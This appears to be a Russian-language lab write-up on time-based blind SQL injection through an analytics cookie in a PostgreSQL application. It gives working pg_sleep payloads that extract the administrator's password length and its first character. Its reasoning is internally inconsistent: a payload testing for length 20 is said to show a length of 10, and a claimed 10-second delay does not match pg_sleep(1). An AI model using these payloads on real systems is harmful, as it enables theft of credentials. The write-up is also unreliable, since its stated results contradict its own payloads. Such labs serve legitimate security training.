Описание:
```
Эта лабораторная работа содержит уязвимость слепой SQL-инъекции. Приложение использует отслеживающий cookie для аналитики и выполняет SQL-запрос, содержащий значение отправленного cookie.

Результаты SQL-запроса не возвращаются, и приложение не отвечает по-разному в зависимости от того, возвращает ли запрос какие-либо строки или вызывает ошибку.

База данных содержит другую таблицу под названием users с колонками username и password. Вам нужно проэксплуатировать уязвимость слепой SQL-инъекции, чтобы узнать пароль пользователя administrator.
```

На сайте используется PostgreSQL, т.к. такой payload вызвал задержку в 10 сек на ответ:
![](../../../z.%20Images/{44A2ECE2-6323-48A6-AB57-B67DA830DAF4}.png)
Также важно закодировать символ `;`, чтобы он не считался разделением `Cookies`.

Payload:
```
x'%3BSELECT CASE+WHEN+(SELECT+LENGTH(password)+=+20+FROM+users+WHERE+username='administrator')+THEN+pg_sleep(1)+ELSE+pg_sleep(0) END--
```
Вызвал задержку, значит длина пароля администратора = 10 символов.

Payload:
```
x'%3BSELECT CASE+WHEN+(SELECT+SUBSTRING(password,1,1)+=+'6'+FROM+users+WHERE+username='administrator')+THEN+pg_sleep(1)+ELSE+pg_sleep(0) END--
```
Взывал задержку, значит первый символ пароля - `6`.
